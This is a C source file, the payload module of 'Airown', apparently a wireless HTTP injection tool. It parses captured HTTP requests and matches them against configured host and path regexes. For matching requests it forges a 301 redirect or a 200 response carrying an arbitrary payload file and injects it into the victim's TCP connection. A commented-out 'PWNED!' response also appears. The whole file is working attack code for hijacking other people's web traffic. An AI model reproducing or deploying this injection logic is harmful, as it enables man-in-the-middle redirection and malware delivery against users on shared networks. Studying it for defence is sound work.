/*
 * Airown - payload
 *
 * Copyright (C) 2010 sh0 <sh0@yutani.ee>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

// Int inc
#include "ao_config.h"
#include "ao_main.h"
#include "ao_payload.h"
#include "ao_util.h"
#include "http_parser.h"
#include "pk_packet.h"
#include "pk_inject_tcp.h"

// Payload structure
#define PL_CAP_NONE 0
#define PL_CAP_HTTP 1
#define PL_INJ_NONE 0
#define PL_INJ_HTTP 1
typedef struct {
    gchar* pl_name;
    
    guint cap_type;
    gchar* cap_http_host;
    gchar* cap_http_path;
    
    guint inj_type;
    gchar* inj_http_content_type;
    gchar* inj_http_location;
    gchar* inj_http_pl_file;
    guint8* inj_http_pl_data;
    guint32 inj_http_pl_size;
} st_pl_target;

// Payload data
GList* pl_targets = NULL;

// HTTP struct
typedef struct {
    gchar* req_url;
    gchar* req_path;
    guint hdr_type;
    gchar* hdr_host;
} st_http_data;

// HTTP settings
http_parser_settings http_settings;
http_parser http_inst;

// HTTP callbacks
int ao_http_req_url(http_parser* parser, const char* at, size_t length);
int ao_http_req_path(http_parser* parser, const char* at, size_t length);
int ao_http_hdr_field(http_parser* parser, const char* at, size_t length);
int ao_http_hdr_value(http_parser* parser, const char* at, size_t length);

// Payload functions
void ao_payload_cap(st_ao_packet* pck, st_http_data* http_data);
void ao_payload_inj(st_ao_packet* pck, st_pl_target* target);

// Functions
gboolean ao_payload_init()
{
    // HTTP parser settings
    memset(&http_settings, 0, sizeof(http_parser_settings));
    http_settings.on_url = ao_http_req_url;
    http_settings.on_path = ao_http_req_path;
    http_settings.on_header_field = ao_http_hdr_field;
    http_settings.on_header_value = ao_http_hdr_value;
    
    // HTTP parser init
    http_parser_init(&http_inst, HTTP_REQUEST);

    // Open config
    if ((ao_inst.cmd_payload == NULL) || (strlen(ao_inst.cmd_payload) <= 0)) {
        g_print("[pay] no payload config!\n");
        return TRUE;
    }
    GError* err = NULL;
    GKeyFile* key = g_key_file_new();
    if (key == NULL) {
        g_print("[pay] error creating glib key file handler!\n");
        return FALSE;
    }
    if (g_key_file_load_from_file(key, ao_inst.cmd_payload, G_KEY_FILE_NONE, &err) == FALSE) {
        if (err != NULL) {
            g_print("[pay] error opening payload configuration! error=%s\n", err->message);
            g_clear_error(&err);
        } else {
            g_print("[pay] error opening payload configuration!\n");
        }
        return FALSE;
    }
    
    // Enumerate targets
    gchar** groups = g_key_file_get_groups(key, NULL);
    gint i = 0;
    while (groups[i] != NULL) {
        // Allocate target
        st_pl_target* target = g_new(st_pl_target, 1);
        memset(target, 0, sizeof(st_pl_target));
        
        // Get configuration data
        target->pl_name = g_strdup(groups[i]);
        
        // Identification ruleset
        target->cap_type = PL_CAP_HTTP;
        target->cap_http_host = g_key_file_get_string(key, groups[i], "cap_http_host", NULL);
        target->cap_http_path = g_key_file_get_string(key, groups[i], "cap_http_path", NULL);
        
        // Injection ruleset
        target->inj_type = PL_INJ_HTTP;
        target->inj_http_content_type = g_key_file_get_string(key, groups[i], "inj_http_content_type", NULL);
        target->inj_http_location = g_key_file_get_string(key, groups[i], "inj_http_location", NULL);
        target->inj_http_pl_file = g_key_file_get_string(key, groups[i], "inj_http_pl_file", NULL);
        
        // Load payload data
        if (target->inj_http_pl_file) {
            FILE* fs = fopen(target->inj_http_pl_file, "rb");
            if (fs != NULL) {
                // Get size and read data
                fseek(fs, 0, SEEK_END);
                target->inj_http_pl_size = ftell(fs);
                fseek(fs, 0, SEEK_SET);
                target->inj_http_pl_data = g_malloc(target->inj_http_pl_size);
                gint num = fread(target->inj_http_pl_data, 1, target->inj_http_pl_size, fs);
                if (num != target->inj_http_pl_size) {
                    g_print("[pay] unable to read all data! read=%u, size=%u\n",
                        num, target->inj_http_pl_size);
                }
                fclose(fs);
            } else {
                // Log and free target
                g_print("[pay] error opening payload file! target=%s, file=%s\n", target->pl_name, target->inj_http_pl_file);
                if (target->pl_name)
                    g_free(target->pl_name);
                if (target->cap_http_host)
                    g_free(target->cap_http_host);
                if (target->cap_http_path)
                    g_free(target->cap_http_path);
                if (target->inj_http_content_type)
                    g_free(target->inj_http_content_type);
                if (target->inj_http_location)
                    g_free(target->inj_http_location);
                if (target->inj_http_pl_file)
                    g_free(target->inj_http_pl_file);
                g_free(target);
                target = NULL;
            }
        }
        
        // Add to list of targets
        if (target != NULL) {
            pl_targets = g_list_append(pl_targets, target);
        }
        
        // Next target
        i++;
    }
    g_strfreev(groups);
    
    // Return
    return TRUE;
}

void ao_payload_end()
{
    while (pl_targets) {
        // Pointer
        st_pl_target* target = (st_pl_target*) pl_targets->data;
        
        // Free
        if (target->pl_name)
            g_free(target->pl_name);
        if (target->cap_http_host)
            g_free(target->cap_http_host);
        if (target->cap_http_path)
            g_free(target->cap_http_path);
        if (target->inj_http_content_type)
            g_free(target->inj_http_content_type);
        if (target->inj_http_location)
            g_free(target->inj_http_location);
        if (target->inj_http_pl_file)
            g_free(target->inj_http_pl_file);
        if (target->inj_http_pl_data)
            g_free(target->inj_http_pl_data);
        g_free(target);
        
        // Unlist
        pl_targets = g_list_remove(pl_targets, target);
    }
}

void ao_payload_pck(st_ao_packet* pck)
{
    // Size check
    if (pck->pl_size == 0)
        return;
    
    // Decode
    st_http_data http_data;
    memset(&http_data, 0, sizeof(st_http_data));
    http_inst.data = (gpointer) &http_data;
    http_parser_execute(&http_inst, &http_settings, (gchar*) pck->pl_data, pck->pl_size);
    http_parser_execute(&http_inst, &http_settings, NULL, 0);
    
    // Log
    if (http_data.hdr_host || http_data.req_url) {
        if (http_inst.method == HTTP_GET || http_inst.method == HTTP_POST) {
            g_print("[pay] http request! host=%s, request=%s\n",
                http_data.hdr_host ? http_data.hdr_host : "<NULL>",
                http_data.req_url ? http_data.req_url : "<NULL>"
            );
            
            // Inject
            ao_payload_cap(pck, &http_data);
        }
    }
    
    // Free
    if (http_data.req_url)
        g_free(http_data.req_url);
    if (http_data.req_path)
        g_free(http_data.req_path);
    if (http_data.hdr_host)
        g_free(http_data.hdr_host);
}

void ao_payload_cap(st_ao_packet* pck, st_http_data* http_data)
{
    GList* tlist = g_list_first(pl_targets);
    while (tlist) {
        // Target
        st_pl_target* target = (st_pl_target*) tlist->data;
        
        // HTTP matching
        if (target->cap_type == PL_CAP_HTTP) {
            
            // Match path and host
            gint match_path = 0;
            if (target->cap_http_path && http_data->req_url)
                match_path = g_regex_match_simple(target->cap_http_path, http_data->req_url, 0, 0) ? 2 : 1;
            
            gint match_host = 0;
            if (target->cap_http_host && http_data->hdr_host)
                match_host = g_regex_match_simple(target->cap_http_host, http_data->hdr_host, 0, 0) ? 2 : 1;
            
            // Check if matches
            //g_print("[pay] http match! path=%d, host=%d\n", match_path, match_host);
            if ((match_path == 2 || match_host == 2) && !(match_path == 1 || match_host == 1)) {
                ao_payload_inj(pck, target);
                return;
            }
        
        }
    
        // Next target
        tlist = g_list_next(tlist);
    }
}

void ao_payload_inj(st_ao_packet* pck, st_pl_target* target)
{
    g_print("[pay] target=%s\n", target->pl_name);
    
    // HTTP injection
    if (target->inj_type == PL_INJ_HTTP) {
        // Response
        //char* rsp_data = "HTTP/1.1 200 OK\r\n"
        //    "Content-Type: text/html;charset=UTF-8\r\n"
        //    "Content-Length: 6\r\n"
        //    "\r\nPWNED!";
        
        // Allocate data
        gchar* inj_location = NULL;
        gchar* inj_head = NULL;
        if (target->inj_http_location) {
            inj_head = g_strdup_printf(
                "HTTP/1.1 301 Moved Permanently\r\n"
                "Location: %s\r\n\r\n",
                target->inj_http_location
            );
        } else {
            inj_head = g_strdup_printf(
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: %s\r\n"
                "Content-Length: %u\r\n"
                "%s"
                "\r\n",
                target->inj_http_content_type != NULL ? target->inj_http_content_type : "text/html; charset=utf-8",
                target->inj_http_pl_size,
                inj_location ? inj_location : ""
            );
        }
        
        // Copy data
        guint8* inj_data = g_malloc(strlen(inj_head) + target->inj_http_pl_size);
        g_memmove(inj_data, inj_head, strlen(inj_head));
        if (target->inj_http_pl_size > 0)
            g_memmove(inj_data + strlen(inj_head), target->inj_http_pl_data, target->inj_http_pl_size);
        
        // Inject
        guint32 inj_size = strlen(inj_head) + target->inj_http_pl_size;
        inj_tcp(pck, inj_data, inj_size);
        
        // Free data
        g_free(inj_data);
        g_free(inj_head);
    }
}

int ao_http_req_url(http_parser* parser, const char* at, size_t length)
{
    st_http_data* http = (st_http_data*) parser->data;
    if (http->req_url)
        g_free(http->req_url);
    http->req_url = g_strndup(at, length);
    
    return 0;
}

int ao_http_req_path(http_parser* parser, const char* at, size_t length)
{
    st_http_data* http = (st_http_data*) parser->data;
    if (http->req_path)
        g_free(http->req_path);
    http->req_path = g_strndup(at, length);
    
    return 0;
}

int ao_http_hdr_field(http_parser* parser, const char* at, size_t length)
{
    st_http_data* http = (st_http_data*) parser->data;
    
    if (strncmp("Host", at, length) == 0) {
        http->hdr_type = 1;
    } else {
        http->hdr_type = 0;
    }
    
    return 0;
}

int ao_http_hdr_value(http_parser* parser, const char* at, size_t length)
{
    st_http_data* http = (st_http_data*) parser->data;
    
    if (http->hdr_type == 1) {
        if (http->hdr_host)
            g_free(http->hdr_host);
        http->hdr_host = g_strndup(at, length);
    }
    
    http->hdr_type = 0;

    return 0;
}

